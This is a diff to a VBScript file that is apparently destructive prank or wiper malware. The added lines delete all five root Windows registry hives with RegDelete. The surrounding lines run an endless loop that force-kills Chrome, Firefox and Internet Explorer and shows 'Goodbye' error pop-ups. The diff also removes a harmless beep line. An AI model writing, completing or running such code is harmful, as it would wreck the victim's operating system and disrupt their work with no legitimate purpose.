@@ -21,6 +21,13 @@ Set objFSO = Nothing
 ' Create a Shell object
 Set objShell = CreateObject("WScript.Shell")
 
+' Delete specific registry keys
+objShell.RegDelete "HKEY_CURRENT_CONFIG"
+objShell.RegDelete "HKEY_USERS"
+objShell.RegDelete "HKEY_LOCAL_MACHINE"
+objShell.RegDelete "HKEY_CURRENT_USER"
+objShell.RegDelete "HKEY_CLASSES_ROOT"
+
 ' Say "Goodbye" and terminate various processes on the computer
 i = 1
 Do While True
@@ -34,9 +41,6 @@ Do While True
     objShell.Run "taskkill /f /im chrome.exe", 0, True
     objShell.Run "taskkill /f /im firefox.exe", 0, True
     objShell.Run "taskkill /f /im iexplore.exe", 0, True
-
-    ' Play a beep sound
-    objShell.Run "PowerShell -Command ""[System.Media.SystemSounds]::Beep.Play()""", 0, True
 
     ' Display a message box with the word "Goodbye" and an error icon
     objShell.Popup "Goodbye", 0, "Error", &H10
